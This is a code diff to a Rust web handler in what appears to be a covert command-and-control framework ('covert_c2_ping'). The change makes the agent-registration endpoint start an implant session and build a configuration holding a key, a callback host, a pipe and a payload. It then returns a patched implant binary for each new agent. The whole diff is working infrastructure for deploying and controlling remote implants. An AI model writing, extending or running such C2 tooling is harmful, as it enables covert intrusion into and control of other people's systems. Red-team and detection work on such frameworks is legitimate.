@@ -1,5 +1,5 @@
-use crate::{worker::session_worker, CHANNEL, GLOBAL_CONF};
-use covert_c2_ping_common::PingMessage;
+use crate::{patcher, workers::session, CHANNEL, GLOBAL_CONF, KEY};
+use covert_c2_ping_common::{ClientConfig, PingMessage};
 use serde::Deserialize;
 use std::{
     sync::atomic::{AtomicU16, Ordering},
@@ -13,6 +13,7 @@ pub struct NewAgent {
     pub arch: String,
     pub sleep: u64,
     pub pipe: String,
+    pub host: String,
 }
 
 #[derive(Deserialize)]
@@ -28,25 +29,37 @@ pub async fn web_worker() -> () {
     let get = warp::get().map(|| "Connected agents");
     let post = warp::post()
         .and(warp::body::json::<NewAgent>())
-        .and_then(start_session);
-
-    let api = warp::path("api/agents").and(get.or(post).or(patch));
-    //warp::filters::fs::dir("./static");
-    warp::serve(api).bind(([0, 0, 0, 0], 8080)).await;
+        .and_then(post_agent);
+    let api = warp::path("/api/agents").and(get.or(post).or(patch));
+    let root = warp::path("/").and(warp::filters::fs::dir("static"));
+    warp::serve(api.or(root)).bind(([0, 0, 0, 0], 8080)).await;
 }
 
 static AGENT_COUNT: AtomicU16 = AtomicU16::new(1);
 
-async fn start_session(new_agent: NewAgent) -> Result<impl Reply, Rejection> {
+async fn post_agent(new_agent: NewAgent) -> Result<impl Reply, Rejection> {
     let (payload, connection) =
         covert_server::start_implant_session(&GLOBAL_CONF.ts, &new_agent.arch, &new_agent.pipe)
             .await
             .or(Err(warp::reject::reject()))?;
 
     let id: u16 = AGENT_COUNT.fetch_add(1, Ordering::SeqCst);
-    task::spawn(session_worker(connection, id));
+    task::spawn(session::session_worker(connection, id));
+
+    let req_conf: ClientConfig = ClientConfig {
+        id,
+        key: *KEY,
+        host: &new_agent.host,
+        pipe: &new_agent.pipe,
+        payload: &payload,
+        sleep: new_agent.sleep,
+    };
+
+    let bin = patcher::get_patched_bin(req_conf, new_agent.arch)
+        .await
+        .or(Err(warp::reject::reject()))?;
     let response = Response::builder()
-        .body(payload)
+        .body(bin)
         .or(Err(warp::reject::reject()))?;
     Ok(response)
 }
